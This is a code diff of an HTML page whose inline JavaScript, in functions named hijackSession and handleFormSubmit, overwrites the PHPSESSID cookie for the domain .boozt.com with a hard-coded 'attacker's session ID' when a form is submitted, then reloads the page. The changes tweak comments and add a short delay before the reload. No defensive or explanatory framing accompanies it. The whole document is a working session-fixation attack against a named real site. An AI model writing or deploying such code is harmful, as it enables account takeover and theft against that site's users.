@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,16 +8,18 @@
     // Function to change PHPSESSID to the attacker's session ID
     function hijackSession() {
       // Set the cookie to the attacker's session ID for the target domain
-      document.cookie = "PHPSESSID=3nrr7ng13304l5k2dntbp6a18n; path=/; domain=.boozt.com";  // Use the correct session ID
+      document.cookie = "PHPSESSID=3nrr7ng13304l5k2dntbp6a18n; path=/; domain=.boozt.com";  // Replace with actual session ID
 
-      // Automatically refresh the page after changing the cookie
-      window.location.reload();
+      // Wait a brief moment to ensure the cookie is set, then refresh the page
+      setTimeout(function() {
+        location.reload();
+      }, 100);  // 100 milliseconds delay to ensure cookie is set before reloading
     }
 
     // Run hijackSession when the form is submitted
     function handleFormSubmit(event) {
-      event.preventDefault();  // Prevents default form submission
-      hijackSession();
+      event.preventDefault();  // Prevent the form from submitting the usual way
+      hijackSession();  // Trigger the session hijacking
     }
   </script>
 </head>
